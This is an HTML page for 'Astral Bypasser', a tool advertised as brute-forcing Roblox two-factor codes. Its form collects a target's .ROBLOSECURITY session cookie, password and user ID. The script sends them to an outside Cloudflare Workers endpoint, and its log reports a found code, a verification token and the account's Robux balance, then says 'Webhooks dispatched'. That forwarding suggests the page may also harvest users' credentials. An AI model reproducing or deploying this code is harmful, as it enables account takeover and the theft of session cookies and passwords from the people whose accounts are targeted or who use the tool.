<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Astral Bypasser</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap');

        :root {
            --bg-primary: #0a0a0f;
            --bg-secondary: #12121f;
            --bg-card: #18182b;
            --bg-input: #0f0f1a;
            --purple-primary: #8b5cf6;
            --purple-glow: #a78bfa;
            --purple-dark: #5b21b6;
            --purple-dim: #3b1f7a;
            --text-primary: #e2e2f0;
            --text-secondary: #a0a0b8;
            --text-accent: #c4b5fd;
            --border-glow: rgba(139, 92, 246, 0.3);
            --shadow-glow: 0 0 40px rgba(139, 92, 246, 0.15);
        }

        body {
            background: var(--bg-primary);
            color: var(--text-primary);
            font-family: 'Rajdhani', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background-image:
                radial-gradient(ellipse at 20% 50%, rgba(91, 33, 182, 0.12) 0%, transparent 60%),
                radial-gradient(ellipse at 80% 50%, rgba(91, 33, 182, 0.08) 0%, transparent 60%),
                radial-gradient(ellipse at 50% 100%, rgba(139, 92, 246, 0.05) 0%, transparent 50%);
        }

        ::-webkit-scrollbar {
            width: 6px;
        }
        ::-webkit-scrollbar-track {
            background: var(--bg-secondary);
        }
        ::-webkit-scrollbar-thumb {
            background: var(--purple-primary);
            border-radius: 10px;
        }

        .container {
            width: 100%;
            max-width: 520px;
            background: var(--bg-secondary);
            border-radius: 28px;
            padding: 40px 32px 32px;
            box-shadow: var(--shadow-glow), inset 0 1px 0 rgba(139, 92, 246, 0.1);
            border: 1px solid rgba(139, 92, 246, 0.12);
            position: relative;
            overflow: hidden;
        }

        .container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at 30% 20%, rgba(139, 92, 246, 0.03) 0%, transparent 60%);
            pointer-events: none;
        }

        .header {
            display: flex;
            align-items: center;
            gap: 16px;
            margin-bottom: 32px;
            position: relative;
            z-index: 1;
        }

        .logo {
            width: 52px;
            height: 52px;
            border-radius: 14px;
            background: var(--bg-card);
            padding: 6px;
            border: 1px solid rgba(139, 92, 246, 0.25);
            box-shadow: 0 0 30px rgba(139, 92, 246, 0.08);
            flex-shrink: 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .logo img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            border-radius: 8px;
        }

        .header-text {
            flex: 1;
        }

        .header-text h1 {
            font-family: 'Orbitron', monospace;
            font-weight: 900;
            font-size: 22px;
            letter-spacing: 2px;
            background: linear-gradient(135deg, #c4b5fd, #8b5cf6, #6d28d9);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-shadow: 0 0 40px rgba(139, 92, 246, 0.2);
            line-height: 1.2;
        }

        .header-text .sub {
            font-size: 12px;
            font-weight: 400;
            color: var(--text-secondary);
            letter-spacing: 3px;
            text-transform: uppercase;
            margin-top: 2px;
            opacity: 0.7;
        }

        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(139, 92, 246, 0.12);
            border: 1px solid rgba(139, 92, 246, 0.18);
            border-radius: 50px;
            padding: 4px 14px 4px 10px;
            font-size: 11px;
            font-weight: 600;
            color: var(--text-accent);
            letter-spacing: 0.5px;
            margin-left: auto;
            flex-shrink: 0;
        }

        .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #22c55e;
            animation: pulse-dot 1.8s ease-in-out infinite;
            box-shadow: 0 0 12px rgba(34, 197, 94, 0.3);
        }

        @keyframes pulse-dot {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.4; transform: scale(0.8); }
        }

        .input-group {
            margin-bottom: 18px;
            position: relative;
            z-index: 1;
        }

        .input-group label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: var(--text-secondary);
            margin-bottom: 6px;
            letter-spacing: 0.5px;
            text-transform: uppercase;
        }

        .input-group label .required {
            color: var(--purple-primary);
            margin-left: 2px;
        }

        .input-group label .optional {
            color: var(--text-secondary);
            font-weight: 300;
            opacity: 0.4;
            font-size: 11px;
        }

        .input-group input,
        .input-group textarea {
            width: 100%;
            padding: 12px 16px;
            background: var(--bg-input);
            border: 1px solid rgba(139, 92, 246, 0.15);
            border-radius: 12px;
            color: var(--text-primary);
            font-family: 'Rajdhani', sans-serif;
            font-size: 14px;
            transition: all 0.3s ease;
            outline: none;
            resize: vertical;
        }

        .input-group input::placeholder,
        .input-group textarea::placeholder {
            color: rgba(160, 160, 184, 0.4);
            font-weight: 300;
        }

        .input-group input:focus,
        .input-group textarea:focus {
            border-color: var(--purple-primary);
            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.12), 0 0 20px rgba(139, 92, 246, 0.05);
            background: #111121;
        }

        .input-group input[type="password"] {
            font-family: 'Rajdhani', sans-serif;
            letter-spacing: 2px;
        }

        .input-group textarea {
            min-height: 60px;
            max-height: 120px;
            font-size: 13px;
            line-height: 1.5;
        }

        .input-group .hint {
            font-size: 11px;
            color: var(--text-secondary);
            opacity: 0.5;
            margin-top: 4px;
            font-weight: 300;
        }

        .password-wrapper {
            position: relative;
        }

        .password-wrapper input {
            padding-right: 48px;
        }

        .toggle-password {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: var(--text-secondary);
            opacity: 0.4;
            cursor: pointer;
            font-size: 16px;
            transition: opacity 0.2s;
            padding: 4px;
        }

        .toggle-password:hover {
            opacity: 0.8;
        }

        .range-row {
            display: flex;
            gap: 12px;
            align-items: center;
        }

        .range-row .input-group {
            flex: 1;
            margin-bottom: 0;
        }

        .range-row .input-group input {
            text-align: center;
            font-family: 'Orbitron', monospace;
            font-size: 13px;
            letter-spacing: 1px;
            padding: 10px 8px;
        }

        .range-sep {
            color: var(--text-secondary);
            font-weight: 300;
            opacity: 0.4;
            font-size: 14px;
            padding-top: 6px;
        }

        .btn-primary {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #7c3aed, #5b21b6);
            border: none;
            border-radius: 14px;
            color: #fff;
            font-family: 'Orbitron', monospace;
            font-weight: 700;
            font-size: 15px;
            letter-spacing: 2px;
            text-transform: uppercase;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            box-shadow: 0 4px 25px rgba(91, 33, 182, 0.3);
            margin-top: 8px;
        }

        .btn-primary:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 8px 40px rgba(91, 33, 182, 0.4);
            background: linear-gradient(135deg, #8b5cf6, #6d28d9);
        }

        .btn-primary:active:not(:disabled) {
            transform: translateY(0px) scale(0.98);
        }

        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }

        .btn-primary .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255,255,255,0.2);
            border-top: 2px solid #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }

        .btn-primary.loading .btn-text {
            display: none;
        }
        .btn-primary.loading .spinner {
            display: block;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .log-container {
            margin-top: 22px;
            background: var(--bg-card);
            border-radius: 14px;
            border: 1px solid rgba(139, 92, 246, 0.08);
            overflow: hidden;
            position: relative;
            z-index: 1;
        }

        .log-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 16px;
            background: rgba(0,0,0,0.2);
            border-bottom: 1px solid rgba(139, 92, 246, 0.06);
        }

        .log-header span {
            font-size: 11px;
            font-weight: 600;
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 1.5px;
        }

        .log-header .clear-log {
            background: none;
            border: none;
            color: var(--text-secondary);
            font-size: 11px;
            cursor: pointer;
            opacity: 0.4;
            transition: opacity 0.2s;
            font-family: 'Rajdhani', sans-serif;
            font-weight: 600;
        }

        .log-header .clear-log:hover {
            opacity: 1;
        }

        #log {
            height: 180px;
            overflow-y: auto;
            padding: 12px 16px;
            font-family: 'Rajdhani', monospace;
            font-size: 13px;
            line-height: 1.6;
            background: rgba(0,0,0,0.15);
        }

        #log .log-entry {
            padding: 2px 0;
            border-bottom: 1px solid rgba(255,255,255,0.02);
            color: var(--text-secondary);
        }

        #log .log-entry.success {
            color: #4ade80;
        }
        #log .log-entry.error {
            color: #f87171;
        }
        #log .log-entry.info {
            color: var(--text-accent);
        }
        #log .log-entry.warning {
            color: #fbbf24;
        }
        #log .log-entry .timestamp {
            opacity: 0.3;
            font-size: 11px;
            margin-right: 8px;
        }

        .log-empty {
            color: var(--text-secondary);
            opacity: 0.3;
            font-size: 13px;
            text-align: center;
            padding: 40px 0;
            font-weight: 300;
            letter-spacing: 1px;
        }

        .footer {
            text-align: center;
            margin-top: 24px;
            font-size: 11px;
            color: var(--text-secondary);
            opacity: 0.25;
            letter-spacing: 1px;
            font-weight: 300;
            position: relative;
            z-index: 1;
        }

        .footer a {
            color: var(--text-secondary);
            text-decoration: none;
        }

        @media (max-width: 480px) {
            .container {
                padding: 24px 16px 20px;
                border-radius: 20px;
            }
            .header-text h1 {
                font-size: 18px;
            }
            .header {
                gap: 12px;
                flex-wrap: wrap;
            }
            .status-badge {
                font-size: 10px;
                padding: 3px 10px 3px 8px;
            }
            .range-row {
                flex-direction: column;
                gap: 8px;
            }
            .range-row .input-group {
                width: 100%;
            }
            .range-sep {
                display: none;
            }
            .btn-primary {
                font-size: 13px;
                padding: 12px;
            }
            #log {
                height: 140px;
                font-size: 12px;
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <div class="logo">
                <img src="https://media.discordapp.net/attachments/1533506182642139406/1535232987975917639/astrallogo.webp?ex=6a8a2263&is=6a88d0e3&hm=716f34420b673222d21145593cda8d22d70e4cddd9f0d0e9c9105fedbbc6e387&=&format=webp" alt="Astral Logo" />
            </div>
            <div class="header-text">
                <h1>ASTRAL BYPASSER</h1>
                <div class="sub">2FA Brute Engine v2.1</div>
            </div>
            <div class="status-badge">
                <span class="status-dot"></span>
                LIVE
            </div>
        </div>

        <form id="bruteForm" autocomplete="off">
            <div class="input-group">
                <label>.ROBLOSECURITY Cookie <span class="required">*</span></label>
                <input type="text" id="cookieInput" placeholder="Paste your .ROBLOSECURITY cookie here..." required />
                <div class="hint">Full cookie string including the .ROBLOSECURITY= prefix</div>
            </div>

            <div class="input-group">
                <label>Account Password <span class="required">*</span></label>
                <div class="password-wrapper">
                    <input type="password" id="passwordInput" placeholder="Account password for 2FA challenge request..." required />
                    <button type="button" class="toggle-password" id="togglePassword">👁️</button>
                </div>
                <div class="hint">Required to request the 2FA challenge from Roblox</div>
            </div>

            <div class="input-group">
                <label>User ID <span class="required">*</span></label>
                <input type="text" id="userIdInput" placeholder="e.g. 11508677988" required />
                <div class="hint">Target account's numeric User ID</div>
            </div>

            <div class="input-group">
                <label>Username <span class="optional">(optional)</span></label>
                <input type="text" id="usernameInput" placeholder="e.g. sfsddfszdbs" />
                <div class="hint">Display name for reports</div>
            </div>

            <div class="range-row">
                <div class="input-group">
                    <label>Start Code</label>
                    <input type="text" id="startCodeInput" value="000000" maxlength="6" />
                </div>
                <span class="range-sep">→</span>
                <div class="input-group">
                    <label>End Code</label>
                    <input type="text" id="endCodeInput" value="999999" maxlength="6" />
                </div>
            </div>

            <button type="submit" class="btn-primary" id="submitBtn">
                <span class="btn-text">EXECUTE BYPASS</span>
                <span class="spinner"></span>
            </button>
        </form>

        <div class="log-container">
            <div class="log-header">
                <span>Output Log</span>
                <button class="clear-log" id="clearLog">Clear</button>
            </div>
            <div id="log">
                <div class="log-empty">Awaiting execution...</div>
            </div>
        </div>

        <div class="footer">
            ASTRAL · Private Build
        </div>
    </div>

    <script>
        (function() {
            'use strict';

            const form = document.getElementById('bruteForm');
            const cookieInput = document.getElementById('cookieInput');
            const passwordInput = document.getElementById('passwordInput');
            const userIdInput = document.getElementById('userIdInput');
            const usernameInput = document.getElementById('usernameInput');
            const startCodeInput = document.getElementById('startCodeInput');
            const endCodeInput = document.getElementById('endCodeInput');
            const submitBtn = document.getElementById('submitBtn');
            const logContainer = document.getElementById('log');
            const clearLogBtn = document.getElementById('clearLog');
            const togglePasswordBtn = document.getElementById('togglePassword');

            togglePasswordBtn.addEventListener('click', function() {
                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                passwordInput.setAttribute('type', type);
                this.textContent = type === 'password' ? '👁️' : '👁️‍🗨️';
            });

            function log(message, type) {
                type = type || 'info';

                const empty = logContainer.querySelector('.log-empty');
                if (empty) empty.remove();

                const entry = document.createElement('div');
                entry.className = 'log-entry ' + type;

                const ts = new Date();
                const timeStr =
                    String(ts.getHours()).padStart(2, '0') + ':' +
                    String(ts.getMinutes()).padStart(2, '0') + ':' +
                    String(ts.getSeconds()).padStart(2, '0');

                entry.innerHTML = `<span class="timestamp">[${timeStr}]</span> ${message}`;
                logContainer.appendChild(entry);
                logContainer.scrollTop = logContainer.scrollHeight;
            }

            function clearLog() {
                logContainer.innerHTML = `<div class="log-empty">Awaiting execution...</div>`;
            }

            clearLogBtn.addEventListener('click', clearLog);

            function padCode(val) {
                val = val.replace(/\D/g, '');
                while (val.length < 6) val = '0' + val;
                return val.slice(0, 6);
            }

            function isValidUserId(val) {
                return /^\d+$/.test(val) && val.length >= 1;
            }

            function isValidCookie(val) {
                return val.includes('.ROBLOSECURITY=') && val.length > 20;
            }

            function isValidPassword(val) {
                return val && val.length >= 1;
            }

            const WORKER_URL = 'https://astralbyoass.voidlureee.workers.dev';

            form.addEventListener('submit', async function(e) {
                e.preventDefault();

                const cookie = cookieInput.value.trim();
                const password = passwordInput.value.trim();
                const userId = userIdInput.value.trim();
                const username = usernameInput.value.trim() || 'Unknown_User';
                let startCode = startCodeInput.value.trim() || '000000';
                let endCode = endCodeInput.value.trim() || '999999';

                if (!isValidCookie(cookie)) {
                    log('Invalid .ROBLOSECURITY cookie format', 'error');
                    return;
                }

                if (!isValidPassword(password)) {
                    log('Password is required for challenge request', 'error');
                    return;
                }

                if (!isValidUserId(userId)) {
                    log('Invalid User ID - must be numeric', 'error');
                    return;
                }

                startCode = padCode(startCode);
                endCode = padCode(endCode);
                startCodeInput.value = startCode;
                endCodeInput.value = endCode;

                const startNum = parseInt(startCode, 10);
                const endNum = parseInt(endCode, 10);

                if (startNum > endNum) {
                    log('Start code cannot be greater than end code', 'error');
                    return;
                }

                if (endNum > 999999) {
                    log('End code cannot exceed 999999', 'error');
                    return;
                }

                submitBtn.disabled = true;
                submitBtn.classList.add('loading');
                log(`Starting brute for ${username} (ID: ${userId})`, 'info');
                log(`Range: ${startCode} → ${endCode} (${endNum - startNum + 1} attempts)`, 'info');

                const payload = {
                    cookie: cookie,
                    password: password,
                    userId: userId,
                    username: username,
                    startCode: startNum,
                    endCode: endNum
                };

                try {
                    const response = await fetch(WORKER_URL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    });

                    const data = await response.json();

                    if (data.success) {
                        log(`SUCCESS! Valid 2FA code: ${data.code}`, 'success');
                        log(`Verification token: ${data.token ? data.token.substring(0, 20) + '...' : 'N/A'}`, 'success');
                        if (data.robux !== undefined) {
                            log(`Robux: ${data.robux} | Pending: ${data.pending || 0}`, 'info');
                            log(`Premium: ${data.premium ? 'Yes' : 'No'}`, 'info');
                        }
                        log(`Completed in ${(data.duration / 1000).toFixed(2)}s over ${data.attempts || '?'} attempts`, 'info');
                        log(`Webhooks dispatched`, 'success');
                    } else {
                        log(`Brute failed: ${data.error || 'No valid code found'}`, 'error');
                        log(`Ran ${data.attempts || '?'} attempts in ${(data.duration / 1000).toFixed(2)}s`, 'warning');
                    }

                } catch (err) {
                    log(`Worker error: ${err.message || 'Network failure'}`, 'error');
                    log(`Make sure your Worker is deployed and reachable at: ${WORKER_URL}`, 'warning');
                }

                submitBtn.disabled = false;
                submitBtn.classList.remove('loading');
                log('Operation complete', 'info');
            });

            startCodeInput.addEventListener('input', function() {
                this.value = padCode(this.value);
            });
            endCodeInput.addEventListener('input', function() {
                this.value = padCode(this.value);
            });

            [startCodeInput, endCodeInput].forEach(el => {
                el.addEventListener('keydown', function(e) {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        form.dispatchEvent(new Event('submit'));
                    }
                });
            });

            log('Astral Bypasser v2.1 initialized', 'info');
            log('Password field integrated - challenge requires password', 'info');
            log('Ready for payload', 'info');

        })();
    </script>

</body>
</html>
